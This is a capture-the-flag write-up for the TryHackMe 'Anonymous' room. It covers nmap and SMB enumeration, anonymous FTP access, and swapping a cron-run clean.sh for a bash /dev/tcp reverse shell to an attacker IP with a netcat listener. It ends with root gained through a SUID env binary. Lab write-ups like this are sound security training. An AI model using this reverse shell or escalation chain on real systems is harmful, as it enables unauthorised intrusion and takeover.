# Anonymous - *Not the Hacking Group*


![876a5185c429c9703e625cb48c39637b-2](https://github.com/nic0l0cin/TryHackMe-WriteUps/assets/135453212/17149b3f-a657-4540-b5d3-89a7563126f4)

This is a beginner level challenge room utilizing fundamental techniques with respect to enumeration, privelege escalation, and obtaining root.

Lets GO!

---

## Task 1 - Pwn

### Enumerate!

Q1: Enumerate the machine. How many ports are open?

We start with our typical nmap script scan for open ports and services on the target IP.

`nmap -sS -A -v [target IP]`

![Pasted image 20240409105208](https://github.com/nic0l0cin/TryHackMe-WriteUps/assets/135453212/34ab2d28-c915-4fae-887e-11c5f87be2df)

This scan reveals some good stats. First of all we see four open ports and can answer Q1, Q2, Q3. 

<br>

Since we know what service is running on ports 139 and 445 we can try to get the name of the share.

For full information on this service, we can look at [samba.org](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html), which basically gives us every option for configuration and access. 

We can use this command to find the info:

`smbclient -L [target IP]`

![Pasted image 20240409114121](https://github.com/nic0l0cin/TryHackMe-WriteUps/assets/135453212/de72c742-9faa-4aba-a115-41dec46a9a5f)

No password is set,  so we can just hit enter. And now we can answer Q4.

<br>

Now, we need to establish a foothold on the target. We have an FTP server allowing anonymous access. So, let's see what we find.

We can login as anonymous with no password required:

`ftp [target IP]`

![Pasted image 20240409110057](https://github.com/nic0l0cin/TryHackMe-WriteUps/assets/135453212/25bec018-e05c-41b2-b5e3-d7ec934a59ed)

<br>

So, now that we're logged in to the server, let's have a look. Using `ls -la` we can see what directories are on the server and what privileges are assigned.

![Pasted image 20240409110956](https://github.com/nic0l0cin/TryHackMe-WriteUps/assets/135453212/06f9e983-e12b-427c-9989-2fa8dade203e)

The only visible directory is called 'scripts', and we have full rwx access. So, let's see what's there:

`cd scripts`

then, `ls -la`

![Pasted image 20240409111228](https://github.com/nic0l0cin/TryHackMe-WriteUps/assets/135453212/5c667efe-f6a2-4afa-9275-4bbd7c3af9df)

<br>

Well, we have a text file, let's start there:

![Pasted image 20240409110840](https://github.com/nic0l0cin/TryHackMe-WriteUps/assets/135453212/fdaf9ea9-55dc-4491-9c3a-199c0742ddcb)

This will grab the file and place it in our top level root directory on the local machine.

![Pasted image 20240409111602](https://github.com/nic0l0cin/TryHackMe-WriteUps/assets/135453212/a1680443-0a33-4839-acf7-693f9078a7d5)

<br>

Alternatively, we can run: `get to_do.txt -`  to read the file rather than downloading. It just streamlines the process:

![image](https://github.com/nic0l0cin/TryHackMe-WriteUps/assets/135453212/c3d49239-4834-4889-b1ce-64a70f26908d)


Reading the file does not provide much.

<br>

Note above, the clean.sh script has rwx, read-write-execute access. Let's do the same for this one:

`get clean.sh -`

![Pasted image 20240409115444](https://github.com/nic0l0cin/TryHackMe-WriteUps/assets/135453212/70e015cd-6845-46e4-a003-045f50db5476)

The script is used to check the tmp directory for any files. If no files exist in tmp directory, it will print the output "Running cleanup script: nothing to delete" to a removed_files.log file, which we also see above. If any files exist, the script will remove files in the directory `rm` and recursively force deletion of non-empty directories `-rf` and again, print the output to the same file.

Looking at the removed_files.log contents, it seems that the script runs frequently, as the output is many lines indicating "...nothing to delete", with no logs for deleted files.

I'm curious as to whether the SMB share also allows anonymous login (no password), based on the anonymous access to the FTP server, the ability to use `smbclient` without a password, and the actual file "to_do.txt" noting the need to disable anonymous login. Seems a little sloppy all around!

<br>

Let's try to login to the SMB share 'pics':

`smbclient //10.10.175.3/pics`

![Pasted image 20240409122847](https://github.com/nic0l0cin/TryHackMe-WriteUps/assets/135453212/40df4a83-f8e8-49af-85a8-59894fe1b0e4)

YEP!

<br>

We have some pictures...Let's see if we can grab the files:

![Pasted image 20240409123326](https://github.com/nic0l0cin/TryHackMe-WriteUps/assets/135453212/6a8ab4dd-c130-4caa-bed2-e02b5bd78a07)


What we know:
- Anonymous access to the FTP server
- A cleanup script: clean.sh, with full permissions (read-write-execute)
- We can assume the script is run as a scheduled cronjob
- We can upload files to the server
- We have access to an SMB share named "pics"
- We have grabbed two image files from the share

Ok, so how do we utilize this info? 

<br>

### Exploitation!

Given that we have full perms on the script, we can add our own script this to gain a reverse shell, then put the script on the target machine.

Using the following we will create a bash script called clean.sh:

```
#!/bin/bash

bash -i >& /dev/tcp/[Attacker IP]/4444 0>&1
```

Explanation:
*see [hacktricks](https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/linux) for full info!*

1. `bash -i` : This starts the interactive ( -i ) Bash shell
2. `>&` : This is shorthand notation for redirecting both standard output ( `stdout` ) and standard error ( `stderr` ) to the same destination
3. `/dev/tcp/[Attacker-IP]/4444` :  This represents the TCP connection to the specified IP address and port, to which the above command `>&` will redirect the output of the interactive shell session to our attacking machine
4. `0>&1` : This redirects standard input ( `stdin` ) to the same destination as standard output ( `stdout` ).

<br>

And we can log in to the FTP server and replace the file using:

`put clean.sh`

We will also start a netcat listener from our local machine:

`nc -lvnp 4444`

![Pasted image 20240409131432](https://github.com/nic0l0cin/TryHackMe-WriteUps/assets/135453212/ae2a279b-0105-4aea-aef2-35c4e3bdef97)

and wait for the cronjob to run and connect back to our listener.

<br>

After a few moments:

![Pasted image 20240409131829](https://github.com/nic0l0cin/TryHackMe-WriteUps/assets/135453212/c64a08b2-1c9d-49c3-a007-030ed6d4574e)

We got our shell, as well as user.txt, and can answer Q5!

<br>

Now we need to figure out how to escalate to root.

There are several ways of checking for SUID binaries, but let's start with:

`find / -perm -4000 2>/dev/null`

This returned a lot of results, we need to find something that stands out.

![Pasted image 20240409133339](https://github.com/nic0l0cin/TryHackMe-WriteUps/assets/135453212/7675323f-6ecc-4ddd-bef9-aed5437ab309)

<br>

Checking this using: `ls -lah /usr/bin/env` shows the SUID root bit set. How to escalate? 

Checking [gtfobins](https://gtfobins.github.io/gtfobins/env/#suid) we find this:

![Pasted image 20240409134454](https://github.com/nic0l0cin/TryHackMe-WriteUps/assets/135453212/477783c2-5f12-4a5b-ba97-0cdba7445e7e)

<br>

So, on the target machine:

![Pasted image 20240409135059](https://github.com/nic0l0cin/TryHackMe-WriteUps/assets/135453212/e31dc33e-6741-4496-b2cd-15a0be79f539)


And we got our root.txt flag!

Thank you for reading!


